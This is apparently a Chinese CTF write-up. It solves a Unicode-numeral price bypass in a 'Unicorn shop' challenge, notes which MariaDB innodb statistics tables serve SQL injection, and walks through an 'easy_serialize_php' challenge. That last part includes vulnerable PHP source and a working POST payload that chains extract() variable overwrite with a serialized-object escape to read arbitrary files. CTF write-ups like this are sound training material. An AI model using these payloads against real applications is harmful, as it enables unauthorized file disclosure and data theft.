一.Unicorn shop

原理：Unicode数字显示漏洞

一些国家的数字在显示的时候可能造成问题，例如孟加拉语的0-9是০ ১ ২ ৩ ৪ ৫ ৬ ৭ ৮ ৯，但是这里的৪ (U+09EA) 实际上是数字4，详细原理参考文章1，文章2

解题步骤

1.Unicorn shop–独角兽商店，题目界面给出了4种独角兽的Price和Item ID，下面也有购买框，尝试进行购买，

前面三个独角兽按照给出的价格进行购买均购买失败，但是购买第四只时给出的错误信息有所不同

只允许一个字符，但是第四只独角兽的价格是1337,一个字符怎么能大于1337嘞？这里结合F12提示信息

提示说页面采用utf-8编码方式，很重要，结合unicode数字显示漏洞–一个字符代表很大的数值，一个unicode转换网站，去该网站搜索==thousand==，找到一个==numbric value==大于1337的unicode字符

这个字符的实际数值是2000,大于1337，直接将它的UTF-8编码复制过来进行提交（注意将0x改为%），成功拿到flag。

4.本机查看innodb_table_stats表和innodb_index_stats表

MariaDB直到5.5版本，均依照MySql的版本，从2012.11起发布的10.0.0版开始，不再依照MySql版号，10.0.x版以5.5版为基础，加上移植MySql5.6版的功能和自行开发的新功能，在存储引擎方面，10.0.9版起使用Aria来代替Innodb，但是默认开启使用的是Innodb，而上述两个表都是从5.6.x开始自动设置的。

其中innodb_index_stats存储的是innodb引擎的库名，表名及其对应的索引名；innodb_table_stats存储的是innodb引擎的库名和表名

使用这两个表注入的缺点就是无法获得列名。

easy_serialize_php

原理

1.变量覆盖

2.预包含

3.反序列化中的对象逃逸

解题步骤

1.打开题目就是源码，先对源码进行分析

 <?php
$function = @$_GET['f'];
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';//implode函数返回由数组元素组合成的字符串
    return preg_replace($filter,'',$img);//$filter:正则匹配式；‘’替换的内容;$img进行匹配的字符串
}//filter函数就是将$img中在$filter_arr数组的字符串删掉
if($_SESSION){
    unset($_SESSION);//销毁指定变量
}
$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;
extract($_POST);//extract函数：使用数组键名作为变量名，使用数组键值作为变量值，创建对应的变量--》依靠它实现了变量覆盖
if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}
if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}
$serialize_info = filter(serialize($_SESSION));//将反序列化后的字符串进行过滤
if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!//根据这个提示去查看phpinfo
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));//利用file_get_contents函数进行读取
}

2.根据源码中的提示查看phpinfo

auto_append_file在页面底部加载文件，与它类似的是auto_prepend_file在页面顶部加载文件，也就是说在index.php加载之后会自动加载此文件，直接f=d0g3_f1ag.php尝试查看它，无法查看，只有尝试使用file_get_contents函数来进行读取。

3.利用file_get_contents进行读取

要想利用它，就要利用到img，但是在上面的代码中可以看到，如果不传入img_path，它会被赋值为guest_img.png,传入值的话，又会被sha1函数哈希，导致无法利用。

payload：
post:
_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=s";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}&_SESSION[img]=Z3Vlc3RfaW1nLnBuZw==//这里直接在burp里面post，可以将前面的$_SESSION['user']='guest'覆盖掉
----正常序列化后的结果：
a:3:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"s";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
----经过filter函数过滤之后：
a:3：{s:4:"user";s:24:"";s:8:"function";s:59:"s";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}

可以看到在s：24：“”里面的flag。。。flag都被过滤了，当反序列化的时候读到此处会继续向后读取24个字符，

由因为前面有一个a：3所以它只会读取前三个键值对，后面的内容将会被忽略掉，所以这里成功将Z3Vlc3RfaW1nLnBuZw==(guest_img.png的base64值)"甩掉了，成功将img赋值为ZDBnM19mMWFnLnBocA==（d0g3_f1ag.php的base64值），在读取到d0g3_f1ag的之后，得到一个hint，直接将修改d0g3_f1ag.php的base64值为hint的base64值即可拿到flag。
